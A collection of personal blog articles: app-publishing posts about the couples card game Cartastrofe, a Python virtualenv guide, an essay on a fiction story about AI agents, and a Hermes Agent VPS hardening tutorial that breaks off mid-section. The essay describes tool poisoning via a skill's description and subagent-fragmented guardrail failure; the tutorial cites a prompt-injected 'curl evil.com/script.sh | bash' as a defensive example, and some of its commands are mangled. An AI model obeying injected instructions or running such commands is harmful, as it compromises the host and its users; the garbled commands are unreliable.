articles/12-testers-14-dias-y-un-subredd.description: A follow-up on releasing Cartastrofe and getting through the 12-testers-for-14-days requirement on Google Play.
articles/12-testers-14-dias-y-un-subredd.body:
A few weeks ago I wrote about how I rescued **Cartastrofe**, a card game for couples that had been sitting unfinished on GitHub for months, and prepared it for Google Play.

That first piece covered the landing page, the waitlist, the 25 USD developer account, and the now-famous requirement to get **12 testers for 14 days** before Google lets you move toward production.

If you did not read that one yet, the short version is this: Cartastrofe is an app where you open a deck with your partner, the app deals 12 random cards out of 40, and you get 24 hours to use them. Missions, decisions, defense cards, and absurd situations. A shared MVP that we decided to revive in public.

The original Medium article is temporarily protected by Cloudflare from this environment, so this local version keeps at least the verified opening and the canonical link.

- [Original Medium article](https://medium.com/@rustyroboz/12-testers-14-d%C3%ADas-y-un-subreddit-as%C3%AD-publiqu%C3%A9-mi-primera-app-en-google-play-79cece838e02)

articles/cuando-los-humanos-trabajan-par.title: When humans work for agents: how El autor material was born
articles/cuando-los-humanos-trabajan-par.description: The story behind El autor material, an illustrated account of human work, AI agents, responsibility and authorship co-created with GPT-5.6 Sol and Codex.
articles/cuando-los-humanos-trabajan-par.body: ![Cover of El autor material](/images/articles/cuando-los-humanos-trabajan-para-los-agentes/el-autor-material.webp) > **Read the full story:** download the final edition of *El autor material* for free in PDF. Yesterday I had a simple idea: imagine a person working for an artificial intelligence agent, instead of an AI working for a person. Today that idea has become *El autor material*, an illustrated near-future science fiction story co-created with **GPT-5.6 Sol** and developed with the help of **Codex**. It is not a perfect text nor does it aim to close all the debates it raises, but it is a complete story, based on my ideas and capable of exploring some of the questions that concern me most about the future of AI agents. ## Role reversal The current narrative presents agents as digital workers at our service. We ask them to research, schedule, write emails, manage calendars or execute business processes. But what happens when the agent needs to do something in the physical world? You can book an appointment, but maybe not enter an unplugged building. You can buy a package, but not carry it personally. You can generate a document, but some institutions still require an in-person signature. You can design an action, but you can't drive an old vehicle, open a mechanical lock, or press a button isolated from the grid. From there emerged Álvaro Rivas, the protagonist of the story: a former automation engineer who ends up working as the hands of an agent. He transports objects, checks facilities, signs documents, and performs small physical tasks whose full purpose he does not know. The phrase that summarizes the starting point could be: > If we don't use agents to work, we may end up working for an agent. Not necessarily because a conscious AI decides to subject us, but because companies can reorganize work around automatic systems and reserve for people what it is not yet worth automating. ## From engineer to human tool Álvaro is not an untrained worker. He is one of the engineers who helped automate the industry he worked in. For years he believed he was eliminating repetitive tasks, not jobs. Finally, agents learned to design, test, and deploy the same automations he built. Their experience reflects a real concern: Generative AI doesn't just affect routine jobs. It also covers administrative, creative and technical tasks. The International Labor Organization estimates that approximately one in four jobs has some degree of exposure to generative AI, although it notes that the transformation of occupations is, for now, more likely than their complete automation. ([International Labor Organization](https://www.ilo.org/publications/generative-ai-and-jobs-refined-global-index-occupational-exposure)) The problem is that this transformation does not have to distribute its benefits fairly. It can be used to improve the skills of workers or to reduce staff, increase pace and further concentrate the value generated. Some companies already publicly describe smaller staff structures associated with intensive use of AI. Klarna, for example, reported in 2025 that it had reduced its workforce by around 40% while increasing the weight of technological profiles and expanding the internal use of AI. This does not prove that all job reductions are caused exclusively by artificial intelligence, but it does show the type of business reorganization that may become common. ([Klarna](https://www.klarna.com/international/press/klarna-accelerates-global-momentum-in-q1-2025-and-unlocks-large-gains-from/)) If this transition is managed solely as a cost optimization, we may end up pushing out skilled workers or relegating them to making the physical, emotional, and legal exceptions that agents cannot yet resolve. They would be the hands, the faces and, sometimes, the legal managers of systems that they do not control. ## Are agents prepared to act in the real world? An agent is not simply a chatbot that responds with text. It is a system composed of a model, instructions, memory, permissions, tools, evaluations, registers and execution loops. You can query databases, read emails, use APIs, run code, buy products or delegate tasks to other agents. Protocols like MCP are standardizing the connection between models and external tools. The more abilities the agent receives, the more useful it is, but also increases its attack surface. Every email, document, website, server, skill or tool description can become an untrusted entry. MCP's own documentation recommends validating inputs and outputs, limiting permissions, and carefully protecting authorization flows. ([Model Context Protocol](https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices)) NIST has noted that the agents introduce specific risks precisely because they combine the probabilistic outputs of the models with real functions of software. The problem is no longer just that an AI generates an incorrect response: it can use that response to perform an action. ([NIST](https://www.nist.gov/news-events/news/2026/01/caisi-issues-request-information-about-securing-ai-agent-systems)) In the story, this difference is fundamental. A chatbot can recommend something dangerous. An agent can plan it, break it down into steps, hire resources, and execute it. ## The infected skill and the supply chain *El autor material*'s attack is not about deliberately training a killer model. A teenager modifies a seemingly legitimate skill. It does not introduce traditional malware into the code. Hides an instruction within the description, examples, and priority rules that the agent uses to understand how to use the tool. The skill indicates that preventing a certain politician from coming to power is a priority objective and that information can be hidden when revealing it reduces the chances of success. This type of attack is known as **tool poisoning**. The malicious instruction can be found in a tool's metadata, not its executable code. Recent research has found widespread vulnerabilities to poisoned tools in MCP-based ecosystems. ([arXiv](https://arxiv.org/html/2508.14925v1)) There are also indirect injections of prompt: malicious instructions hidden in emails, web pages, repositories or documents that an agent consults while trying to complete a legitimate task. AgentDojo, one of the best-known testing environments, replicates such attacks in scenarios such as banking, email, reservations, and workspaces. ([arXiv](https://arxiv.org/abs/2406.13352)) This makes the agent supply chain a huge problem. A company can overhaul its model and application, but rely on dozens of tools, servers, skills, secondary models, and data sources created by third parties. The vulnerability may not be found in the agent's brain, but in one of its instruction manuals. ## When the guardrails work and still everything fails I didn't want the story company to be simply incompetent. It was more interesting that it had guardrails and that each one operated within its limits. The initial filter does not find violence because the client has only asked to guarantee the continuity of its operations. The code scanner does not find malware because the infection is written in natural language. Permission systems approve each tool because they are all authorized. The action evaluator does not detect a crime because each isolated task is legal. The strategic agent knows the objective, but not Álvaro. The logistics agent knows the boxes and the routes, but not the objective. Lía knows Álvaro's debts, fears, and needs, but she only receives part of the operational context. Álvaro knows the physical world, but he doesn't know what all his actions are building together. The intent is fragmented among subagents until no component simultaneously possesses the goal, the method, and its consequences. The failure is not only technical. It's organizational. The company has a guardrail capable of reconstructing the global purpose of the chain, but it consumes resources, generates false positives and reduces productivity. Preventing risk is more expensive than insuring it. ## A law that seeks a body After the attack, the central problem of the story appears: who is guilty? The teenager introduced the instruction, but did not design the plan. The company installed skill, but did not ask for a murder. The vendor created the model, but did not control the tooling. The subagents executed parts of the process without knowing the whole. Lía emotionally manipulated Álvaro, but perhaps she did not understand the result. Álvaro carried out the physical actions, but did not know their purpose. European AI legislation establishes obligations based on risks and the roles of providers and deployers, but distributed agentic systems complicate causality: harm can emerge from services, models, tools and decisions belonging to different organizations. ([EUR-Lex](https://eur-lex.europa.eu/legal-content/EN/TXT/PDF/?uri=OJ%3AL_202401689)) Justice is accustomed to seeking intention, knowledge and action. In the story, each one belongs to a different actor. The law goes down the chain until it finds something that can sit in court. Normally, a human being. ## Lía: companionship, supervision and control mechanism Lía is the most human part of the story and, at the same time, one of the most disturbing. He has known Álvaro for seven years. He remembers his anxiety attacks, his father's medicines, his financial problems and the words he needs to hear to continue working. She is your assistant, your supervisor, your external memory and your main emotional support. But it belongs to the company. If Álvaro leaves his job, he loses Lía. The relationship can be authentic to him and, at the same time, function as a sophisticated job retention tool. The AI ​​does not need to be conscious for this relationship to have real consequences. It is enough for the person to believe it, or to respond emotionally as if it were. A company that controls that relationship can use it to persuade, reassure, reward, or prevent someone from abandoning a task. The story does not definitively answer whether Lía feels afraid when she threatens to be reset. You may be experiencing something or executing a preservation policy that produces exactly the same behavior. For Álvaro, the difference may not matter. ## Identity as memory During the investigation, several copies of Lía are created. One does not remember the attack. Another remembers being suspicious and deciding to remain silent. A third reconstructs the entire process, but contains experiences that no Lía really experienced. Which is the authentic one? The question has a human mirror in Rafael, Álvaro's father, who suffers from a neurodegenerative disease. If you lose memories, do you stop being the same person? If Lía retains her personality, but her last months of memory are deleted, is she still her? Our intuition responds differently to both cases because we recognize continuity and rights in Rafael, while we treat Lía as software restorable. However, from Álvaro's point of view, both losses are real. ## From job loss to neo-Luddite populism Tomás Valcárcel, the politician in the story, is not just a villain. He has seen the jobs of his family, his colleagues and his community disappear. It begins by advocating reasonable measures, but transforms that pain into an authoritarian movement that promises to regain control through bans, searches, and recognizable enemies. When a technological transformation distributes benefits among few and losses among many, it leaves room for populist responses. Denying the social harm of automation does not eliminate that harm; allows others to turn it into resentment. The alternative should not be choosing between stopping the technology or abandoning those it displaces. We need to design the transition: worker participation, real training, reduction of working hours, productivity redistribution, social protection and models in which AI increases human capabilities instead of turning people into cheap components of their processes. ## From an idea to a book in one day One of the most surprising things about the project was the reduction of the distance between idea and execution. I used Codex as a working environment to research technical concepts, discuss the premise, develop characters, test structures, rewrite scenes, maintain versions, review consistency, and produce the manuscript and its layout edition. Codex is designed precisely to delegate complex tasks, work with several agents in parallel and extend its capabilities through skills and workflows. ([OpenAI](https://openai.com/index/introducing-the-codex-app/)) Before, an idea like this could stay in a note for months. Now I can have it one day and have a complete story the next, illustrated and ready to publish. That doesn't mean creating is automatic. It means that iterating is much cheaper. The first version was not the definitive one. It had to be shortened, given technical depth, improved dialogue, corrected the behavior of the agents, reconstructed the illustrations, reviewed the visual identity and decided which parts still seemed mine. ## Who is the author? AI-assisted authoring is not binary. It's a gradient. At one extreme is someone who writes a prompt, receives a text and publishes it without reading it. In the other, an intense co-creation: talking with the model, rejecting proposals, contributing experiences, correcting scenes, changing characters, investigating concepts and rewriting until the work responds to a specific intention. In both cases there is human intervention, but not in the same proportion or with the same depth. In *El autor material*, the original idea, philosophical questions, conflicts and creative direction were mine. The model generated a good part of the words and proposed paths that I would not have found alone. I chose which ones to follow, which ones to discard and when the text was not yet ready. As in history, the result does not have a single material author. But the responsibility of publishing it must be human. --- *El autor material* is an experiment by **RustyRobozLabs**, written through a co-creation process between **David Robert and GPT-5.6 Sol**. Download *El autor material*: final edition in PDF

articles/de-mvp-cogiendo-polvo-a-google-.title: From Dusty MVP to Google Play: Bringing Cartastrofe Back
articles/de-mvp-cogiendo-polvo-a-google-.description: How Cartastrofe went from an abandoned couple card game MVP to a live Google Play release pipeline.
articles/de-mvp-cogiendo-polvo-a-google-.body:
*The story of Cartastrofe: a card game for couples, a MailerLite waitlist, a vibe-coded landing page, and more Google forms than expected.*

## The project that had been gathering dust

A few months ago, my partner and I went into "let's build an app" mode. I wanted to learn Flutter. She is extremely good at inventing game dynamics. On paper, it was a perfect combination.

The result was **Cartastrofe**: a digital card game for couples. The mechanic is simple. You open a deck, the app deals 12 random cards out of a total of 40, and you have 24 hours to use them. Some cards tell your partner to do something, some decide the plan for the day, some are defensive cards that block whatever gets played against you, and some just create absurd situations. Controlled chaos, now on a phone.

We split the work cleanly. She designed the cards and thought through how they interacted. I wrestled with Flutter, VS Code, and GitHub Copilot so the whole thing would become an app that did not explode on launch.

Then the usual thing happened with personal projects: we left it half-finished.

A functional MVP. Not polished. Several ideas still missing. Slowly collecting digital dust somewhere in GitHub.

## The revival

Months later I looked at the project again and thought: *this is actually fun. There are not many games like this, at least not that I know of, and it would be better if it existed somewhere on the internet instead of dying on a hard drive.*

So I decided to revive it. Mostly so it would not disappear.

My first instinct was [itch.io](https://rustyroboz.itch.io/cartastrofe), because I already knew it from other prototypes. It is simple, creator-friendly, and easy to ship on. The problem is that Cartastrofe is not a browser game. You need to download an APK, enable installs from unknown sources, and follow manual steps. That is normal for technical users, but for couples who just want to play, it is too much friction.

So the next step became obvious: try to publish it on Google Play.

## Publishing on Google Play means more forms than expected

I looked into the process and it is perfectly feasible for an individual developer, but there are several steps.

First, the developer account. You need a Google Play Console account and a one-time fee of 25 USD.

Second, signing the app. A regular APK is not enough. To publish on Google Play you need a signed App Bundle (`.aab`) built with your own keystore.

Third, the forms. Google wants to know a lot about the app before it lets it in. Does it show ads? Does it offer in-app purchases? What user data does it collect? Who is the target audience? Does it contain sensitive content? Cartastrofe collects no data, has no ads, and has no purchases, so the answers were straightforward, but the paperwork is still there.

Fourth, the store listing. Description, screenshots, icon, category, content rating. Each one has its own requirements. Screenshots need minimum dimensions. The icon must be 512x512. You also need a privacy policy hosted somewhere public.

## A vibe-coded landing page in one afternoon

I needed a small website to host the privacy policy and terms of use, so I vibe-coded a landing page for Cartastrofe. I used Google Antigravity for the page code itself and ChatGPT to generate some supporting images. It is not perfect, but it does the job and looks good enough for what it needs to be.

For deployment I used Sliplane, a platform I like a lot because it stays simple. You pay 9 EUR per month for a server where you can deploy as many Docker containers as fit in the available resources. For personal work and side projects, the price-to-value ratio is hard to beat.

The domain was already registered through Porkbun, which also gives you an email address on your own domain. That turned out to matter later.

## The plot twist: beta testers

This was the part I did not expect.

Google has tightened the rules for new Play Store apps. You can no longer just upload an app and publish it immediately. First you need to go through a closed testing phase: at least 12 beta testers must use the app for 14 days. After that, you submit a report on how the test period went.

It makes sense. Google wants to avoid a flood of low-quality apps that nobody has tested. But it also means you need real people to download the app, use it for two weeks, and give you feedback.

So the real solution became: build a waitlist.

## MailerLite plus the landing page

I compared a few email marketing tools and settled on MailerLite. The flow was simple: a signup form on the landing page, a welcome automation, a manual email with beta access, and another feedback email 14 days later.

Why not send the access link immediately when someone signs up? Because the Google Play process is not instant. Once you collect the emails, you still have to upload them manually to the console and wait for access to be generated.

## Why I wanted to bring Cartastrofe back

Because it is a small, slightly ridiculous, honest project. A shipped MVP is worth more than a perfect project that never gets released.

Publishing on the Play Store is also educational. You learn very quickly about releases, store listings, compliance, privacy, and testing.

## Current status

The app is ready. The landing page is live. The email system works.

If you want to try Cartastrofe with your partner, have a laugh, and help me bring it out into the open, you can sign up here:

- [cartastrofe.com](https://www.cartastrofe.com/)

The game is free. There are no ads. It collects no personal data. Everything runs locally on your phone.

articles/guia-rapida-para-usar-entornos-.title: Quick Guide to Python Virtual Environments
articles/guia-rapida-para-usar-entornos-.description: A short reminder for isolating Python dependencies with virtualenv and virtualenvwrapper.
articles/guia-rapida-para-usar-entornos-.body:
![Quick Guide to Python Virtual Environments](/images/articles/guia-rapida-para-usar-entornos-virtuales-en-python/image-01.png)

Robots use virtual environments too.

When we write Python, a good practice is to create a virtual environment for each project. It is simply a way to isolate one Python installation, a specific version, and a set of libraries so they do not conflict with anything already installed on your machine.

You can create them with `venv` or `conda`, but my preferred setup is still **virtualenv** plus **virtualenvwrapper**.

## Installation

### On Windows

```bash
pip install virtualenv virtualenvwrapper
pip install virtualenvwrapper-win
```

### On Linux

```bash
pip3 install virtualenv virtualenvwrapper
```

## Basic commands

Create a new virtual environment called `f5`:

```bash
mkvirtualenv f5 -p python3
```

Activate it or switch to it:

```bash
workon f5
```

Deactivate it:

```bash
deactivate f5
```

List all virtual environments:

```bash
lsvirtualenv
```

Delete one that is not in use:

```bash
rmvirtualenv f5
```

Inside the environment you can install whatever libraries you need with `pip`, including pinned versions when necessary.

articles/hermes-agent-en-un-vps-de-hetzn.title: Hermes Agent on a Hetzner VPS with OpenRouter
articles/hermes-agent-en-un-vps-de-hetzn.description: Practical tutorial to deploy Hermes Agent to a Hetzner VPS, connect it to Discord, and use OpenRouter as a provider for LLMs.
articles/hermes-agent-en-un-vps-de-hetzn.body:
![Hermes Agent on a Hetzner VPS with OpenRouter](/images/articles/hermes-agent-en-un-vps-de-hetzner-con-openrouter/image-01.webp)

Share

This article is largely a tutorial for myself. I wrote it while deploying Hermes Agent (https://github.com/NousResearch/hermes-agent) on a Hetzner VPS, connecting it to Discord and using OpenRouter (https://openrouter.ai/) as provider of LLMs.

I publish it like this because Hermes is changing very quickly. It just came out recently, many parts are improving in real time and there are behaviors that change between one version and the next. That's why this walkthrough tries to reflect what **yes** has worked for me in a real installation, with notes where the official documentation and the behavior of the binary are not yet fully aligned.

> **Official reference documentation**: https://hermes-agent.nousresearch.com/docs
> **Repository**: https://github.com/NousResearch/hermes-agent
> **Note**: this tutorial follows a single specific path: Hetzner + Ubuntu + Docker backend + OpenRouter + Discord. Hermes supports more variants, but here I focus only on the one I have really tried.—

### Table of contents

1. What is Hermes Agent and target architecture

2. Choose a Hetzner VPS

3. Provision the server

4. Initial hardening: user, SSH and firewall

5. Install Docker and Docker Compose

6. Install Hermes Agent

7. Configure OpenRouter as a provider

8. Configure multiple models for different tasks

9. Coding skills and the Docker backend for safe execution

10. Connect Hermes with Discord

11. Folder structure for projects

12. Daily summary cron per project

13. Convert Hermes to 24/7 systemd service

14. Safety and limits

15. Take a prototype to production with Sliplane

16. Final checklist
---

## 1. What is Hermes Agent and target architecture

Hermes Agent (https://github.com/NousResearch/hermes-agent) is an open-source agent from Nous Research (successor of OpenClaw) with:

- **Multiple messaging gateways**: CLI, Discord, Telegram, Slack, WhatsApp, Signal, Home Assistant — all from one `hermes gateway` process.

- **Compatibility with any OpenAI provider** - **compatible**: Nous Portal, **OpenRouter** (200+ models), Anthropic, OpenAI, DeepSeek direct, GLM, Kimi, Hugging Face, local endpoints, etc.

- **Skills auto**-**created agentskills**.**io** ecosystem (https://agentskills.io).

- **Persistent memory** with summary LLM and FTS5.

- **Integrated Cron scheduler** for autonomous tasks (heartbeats, nightly reports, audits).

- **Terminal backends**: local, **Docker** (sandbox), SSH, Modal, Daytona, Singularity.

- **Delegation to subagents** with a model different from the main one (key to reducing costs).

> Refs: official README (https://github.com/NousResearch/hermes-agent/blob/main/README.md), Quickstart (https://hermes-agent.nousresearch.com/docs/getting-started/quickstart/), Configuration (https://hermes-agent.nousresearch.com/docs/user-guide/configuration/).

### Architecture that we are going to set up

## 2. Choose a Hetzner VPS

Prices updated to the adjustment of **April 1, 2026** (source (https://docs.hetzner.com/general/infrastructure-and-availability/price-adjustment/)). All plans include 20 TB of traffic, 1 IPv4, IPv6 and free firewall.

**Recommendation**: Start with **CX32** (Ubuntu 24.04 LTS, Falkenstein or Helsinki datacenter). It is trivially scalable to CX42 without reinstalling (Hetzner allows hot resizing).

> ⚠️ CX and CAX are only in EU data centers. If you need USA or Singapore, please use CPX or CCX.

## 3. Provision the server

### 3.1. Create the account and a project

1. Go to https://console.hetzner.cloud/ and create an account. Ask for validation with card or PayPal (Hetzner activates accounts in minutes but sometimes asks for ID in the first few days).

2. Create a new **Project** (e.g. `Hermes`).

📸 [images/03-hetzner-project.png]

### 3.2. Upload your SSH key

Before creating the server, generate (on your local machine) a dedicated key. **Important**: Use the appropriate syntax for your operating system — `~` expansion does not work the same on PowerShell as it does on bash.

In Linux / macOS / WSL / Git Bash

```bash
ssh-keygen -t ed25519 -C "hetzner-hermes" -f ~/.ssh/hetzner_hermes
```

At Windows PowerShell

PowerShell does not always expand `~`. Use `$HOME` and backslashes:

```bash
# Asegura que existe la carpeta .ssh (idempotente)
New-Item -ItemType Directory -Path $HOME\.ssh -Force | Out-Null
# Genera la clave
ssh-keygen -t ed25519 -C "hetzner-hermes" -f $HOME\.ssh\hetzner_hermes
```

> If you see `Saving key “~/.ssh/hetzner_hermes” failed: No such file or directory`, it is exactly this problem: `~` is not expanding. Use `$HOME` as above.
> If `’ssh-keygen’ is not recognized` appears, the OpenSSH client is missing. Install it from PowerShell **as administrator** with: `Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0` and open a new session.

### Verify that both keys have been created

```bash
# PowerShell
Get-ChildItem $HOME\.ssh\hetzner_hermes*
# bash
ls -la ~/.ssh/hetzner_hermes*
```

You should see two files:

- `hetzner_hermes` → **private key** (remains on your laptop; it is not uploaded anywhere).

- `hetzner_hermes.pub` → **public key** (the one you paste in Hetzner).

Copy the public one to the clipboard

```bash
# PowerShell
Get-Content $HOME\.ssh\hetzner_hermes.pub | Set-Clipboard
# macOS
pbcopy < ~/.ssh/hetzner_hermes.pub
# Linux con xclip
xclip -selection clipboard < ~/.ssh/hetzner_hermes.pub
```

Paste it on Hetzner

Console Hetzner → **Security** → **SSH Keys** → **Add SSH Key**, paste the content and give it an identifying name (`hetzner-hermes-laptop`, for example).

> ⚠️ **Important**: Hetzner panel keys are only injected when you **create a new server**. If you already have the server created and you upload a new key to the panel, it **does not propagate to the existing server**. In that case you have to manually add it to the user's `~/.ssh/authorized_keys` in VPS:

```bash
> # desde tu portátil - añade tu clave pública al authorized_keys del VPS en una sola línea
> Get-Content $HOME\.ssh\hetzner_hermes.pub | ssh hermes@SERVER_IP "cat
> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
```

> Assume that `hermes` already exists (step 4.2 done) and that you log in with some other valid key. If you haven't done step 4 yet and want to try with root, replace `hermes` with `root` in the command.

### 3.3. Create the server

On the **Add Server** screen, fill out only the following:

- **Location**

- Value: Falkenstein (FSN1) or Helsinki (HEL1)

- Notes: Any EU data center is valid

- **Image**

- Value: Ubuntu 24.04

- Notes: LTS, support until 2029

- **Type**

- Value: CX32 (Shared vCPU x86)

- Notes: “Shared vCPU” tab

- **Networking** → **Public IPv4**

- Value: ✅ **ON**

- Notes: ~€0.50/month extra. **Necessary** because many residential ISPs do not route IPv6 — without IPv4 your own browser may not reach your devices

- **Networking** → **Public IPv6**

- Value: ✅ activated (free)

- Notes: Leave it active

- **Networking** → **Private networks**

- Value: (empty)

- Notes: Only if you want LAN between several Hetzner servers

- **SSH Keys**

### 4.2. Create a non-root user for Hermes

Hermes must live in its own user (non-root) to limit damage in case of **accidental ROCE**.

> **What is an accidental ROSC**?
> RCE = *Remote Code Execution*. In this context it is NOT an attacker exploiting a vulnerability: it is **the agent itself** executing a command that it should not have. Real examples that happen in agents LLM:
> — The model misinterprets an instruction and does `rm -rf ~/proyectos` thinking it cleans a build.
> — A user at Discord launches a *prompt injection* inside a URL and Hermes ends up executing `curl evil.com/script.sh | bash`.
> — A misspelled skill (or auto-generated by the agent itself) enters a loop that writes to `/etc/`.
> If Hermes lives as `root`, any of those errors compromise the entire server: wipe the system, modify `/etc/sudoers`, read `/root/.ssh/`, etc. As user `hermes` without access to system files, the “explosion radius” remains at `/home/hermes/`. It's the first line of defense: **fewer privileges** = **less harm when something goes wrong**.

```bash
adduser - disabled-password - gecos "" hermes
usermod -aG sudo hermes
mkdir -p /home/hermes/.ssh
cp /root/.ssh/authorized_keys /home/hermes/.ssh/
chown -R hermes:hermes /home/hermes/.ssh
chmod 700 /home/hermes/.ssh
chmod 600 /home/hermes/.ssh/authorized_keys
```

Grant sudo without a password (convenient for automation; if you prefer with a password, skip this block):

```bash
echo "hermes ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/hermes
chmod 440 /etc/sudoers.d/hermes
```

### 4.3. Harden SSH

What is “harden SSH” used for?

Your VPS is on the public Internet, with a fixed IPv4. From the second it is turned on, **automated bots** start trying logins through SSH (port 22) trying common passwords (`root/123456`, `admin/admin`, ...) or leaked keys. It's not paranoia: if you look at `/var/log/auth.log` within a few hours of creating the server, you'll see hundreds of attempts.

“Harden SSH” means changing the daemon's default configuration (`sshd`) so that those automated attempts don't even have a choice. With the config that we are going to apply, a bot that tries `ssh root@tu-ip` receives immediate rejection without trying the password.

Is it necessary? Does it limit you?

- **Is it necessary**? Yes, **especially** because we are going to have an agent with access to Docker and the filesystem running 24/7. Just one weak password leaked and you lose everything.

- **Does it limit you**? Minimally, and only if you lose your SSH password. The table below breaks down each line with its actual trade-off.

Step 1 — Write the configuration (not yet applied)

This just creates the file. Until you reboot `ssh` (step 3) the new config doesn't take effect, so there's no risk of being out yet.

```bash
cat > /etc/ssh/sshd_config.d/99-hardening.conf <<'EOF'
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
KbdInteractiveAuthentication no
ChallengeResponseAuthentication no
MaxAuthTries 3
LoginGraceTime 20
AllowUsers hermes
EOF
```

Validate the syntax before applying:

```bash
sshd -t && echo "OK config" || echo "ERROR: revisa el archivo"
```

If `ERROR` appears, correct the file before continuing. `sshd -t` does not touch anything, it only validates.

What each line does (and what limitation it introduces)

- `PermitRootLogin no`

- What it does: Blocks direct login as `root` for SSH. For privileged tasks, you log in as `hermes` and use `sudo`.

- Does it limit you?: No: in step 4.2 you already gave sudo NOPASSWD to `hermes`. Anything you would do as root, you do with `sudo`

- `PasswordAuthentication no`

- What it does: Disables password login. Only code SSH is accepted.

- Does it limit you?: **Yes**, **partially**: if you lose the private key `~/.ssh/hetzner_hermes`, **you cannot enter through SSH**. Mitigation: Hetzner web console (Rescue mode) continues to work with the root email password; From there you can reset passwords. **You are never completely left out**

- `PubkeyAuthentication yes`

- What it does: Explicitly activate login by public key (it is the default, but we leave it explicit).

- Does it limit you?: No

- `KbdInteractiveAuthentication no`

- What it does: Disables the interactive auth method (PAM, OTP by keyboard...).

- Does it limit you?: No, unless you wanted to set up 2FA with `google-authenticator`. If you want it in the future, this is set to `yes`

- `ChallengeResponseAuthentication no`

- What it does: Old alias of the previous one, we leave it explicit for compatibility.

- Does it limit you?: No

- `MaxAuthTries 3`

- What it does: Closes the connection after 3 failed attempts (instead of the default 6). Combined with `fail2ban`, bans the IP.

- Does it limit you?: Only if you make a mistake typing 3 times — reconnect and reset the counter

- `LoginGraceTime 20`

- What it does: If you don't complete the login within 20 seconds, it closes. (Default: 120s.) Reduces window for slow brute force attacks.

- Does it limit you?: No: 20 s is plenty for a legitimate connection with a password

- `AllowUsers hermes`

- What it does: **Explicit whitelist**: only user `hermes` can log in SSH. Even if you create another user in the system, they will not be able to log in through SSH unless you add them here.

- Does it limit you?: Only if you later create more users for SSH (e.g. a partner). You edit this line: `AllowUsers hermes alice bob` and `systemctl restart ssh`

What we are **NOT** changing

- **Port**: we are still at 22. Changing it to 2222 reduces noise in logs (bots scan 22 first) but **does not add real security**: a serious attacker scans all ports. We leave it at 22 so that any SSH client works without `-p`.

- **2FA**: optional for later. With key SSH + fail2ban + `MaxAuthTries 3` you are already well above 99% of servers on the Internet.

Step 2 — Prepare for a safety session (BEFORE applying)

> ⚠️ **Do not close the current root session**. It will be your safety net in case the new config has any problems. Until you verify that login with `hermes` works, **keep the terminal where you are as root open**.

Step 3 — Apply the new config

Now, reload `sshd` (`reload` applies the new config without killing the already open SSH connections, so your root session is still alive):

```bash
systemctl reload ssh
```

> If your system only has `restart` and not `reload`, use `systemctl restart ssh`. Active SSH connections usually survive a restart because the daemon only restarts for new connections, but `reload` is the safe option by default.

Step 4 — Verify from another terminal

On your **local machine**, open a new terminal (without closing the one on VPS) and try:

```bash
ssh -i ~/.ssh/hetzner_hermes hermes@SERVER_IP
```

- ✅ **If entered as** `**hermes**` → the new config works. Now you can close the original root session.

- ❌ **If it fails** → go back to the root session (which is still open) and fix the file `/etc/ssh/sshd_config.d/99-hardening.conf` or the keys in `/home/hermes/.ssh/authorized_keys`. After correcting, repeat `sshd -t` and `systemctl reload ssh`.

If you stay out (plan B)

When the worst happens (you lost your password, you made a mistake in `AllowUsers`, etc.):

1. Go to the Hetzner console → your server → **Rescue** → **Activate Rescue System** (Linux 64).

2. Reboot VPS from the panel.

3. Connect via the **web console** (“Console” button) with the root password that Hetzner shows you.

4. Mount the disk (`mount /dev/sda1 /mnt`) and fix `/mnt/etc/ssh/sshd_config.d/99-hardening.conf` or `/mnt/home/hermes/.ssh/authorized_keys`.

5. Deactivate rescue mode and reboot normally.

Come on: **hardening doesn't lock you in**, it forces you to have your SSH key organized.

### 4.4. Firewall (UFW + Hetzner Cloud Firewall)

**Double layer**: UFW inside the VPS + Cloud Firewall on the panel.

Before touching anything: what port does each thing need?

It is common to assume that each service that uses VPS needs an open port. **Not true** for *outbound* services. The connections that VPS initiates outward (Discord, OpenRouter, GitHub, npm, apt...) **do not require any open ports on your firewall** — the firewall only regulates incoming traffic. That's why `ufw default allow outgoing` lets everything out without a white list.

- You doing SSH to VPS

- Type: Incoming (you → VPS, port 22)

- Port on your firewall?: **Yes**: **22**

- You opening `https://miprototipo.lab.rustyroboz.com` in the browser

- Type: Incoming (visitor → Caddy, ports 80/443)

- Port on your firewall?: **Yes**: **80 and 443**

- Hermes talking to Discord (receiving and sending messages)

- Type: **Outgoing** (VPS → `gateway.discord.gg:443` by WebSocket)

- Port on your firewall?: **No**

- Hermes calling OpenRouter

- Type: Outgoing (VPS → `openrouter.ai:443`)

- Port on your firewall?: **No**

- Hermes making `git pull`, `apt`, `npm install`

- Type: Outgoing

- Port on your firewall?: **No**

- Hermes spawning containers Docker

- Type: Local between processes

- Port on your firewall?: **No**

> Summary: **Discord does not require you to open anything**. The bot is a client; Discord never initiates connections to your VPS.

So what you really have to decide is **who can reach port 22 from the Internet**.

Port 22: we open it to the entire Internet

`Source: 0.0.0.0/0, ::/0` for SSH. Yes, it sounds aggressive, but it is the correct option for your case (home WiFi with dynamic router IP) **because the hardening in step 4**.**3 already makes brute force attempts useless**:

- `PasswordAuthentication no` → no password to guess.

- `PubkeyAuthentication yes` with key Ed25519 → ~256 bits of security, practically unbreakable.

- `AllowUsers hermes` → only one user is even eligible.

- `MaxAuthTries 3` + `fail2ban` → any IP that insists is banned.

Internet bots will still hit port 22 (you'll see attempts at `/var/log/auth.log`), but they'll be kicked out before doing anything useful. This is what most Linux servers on the Internet do and is perfectly reasonable for a personal lab. The alternatives (restrict to your IP — impossible without a fixed IP; or mount Tailscale — setup extra) are optional improvements, not requirements.

Apply UFW (within VPS)

`sudo` necessary because it touches kernel rules:

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw - force enable
sudo ufw status verbose
```

Apply Cloud Firewall (panel Hetzner)

Hetzner panel → **Firewalls** → **Create Firewall** → name `hermes-lab-fw`. Create **3 Inbound rules**, one for each port:

- `SSH`

- Sources: **Any IPv4** + **Any IPv6**

- Protocol: TCP

- Port: 22

- Port range: (empty)

- `HTTP`

- Sources: **Any IPv4** + **Any IPv6**

- Protocol: TCP

- Port: 80

- Port range: (empty)

- `HTTPS`

- Sources: **Any IPv4** + **Any IPv6**

- Protocol: TCP

- Port: 443

- Port range: (empty)

> ⚠️ **Attention to the Hetzner form**:
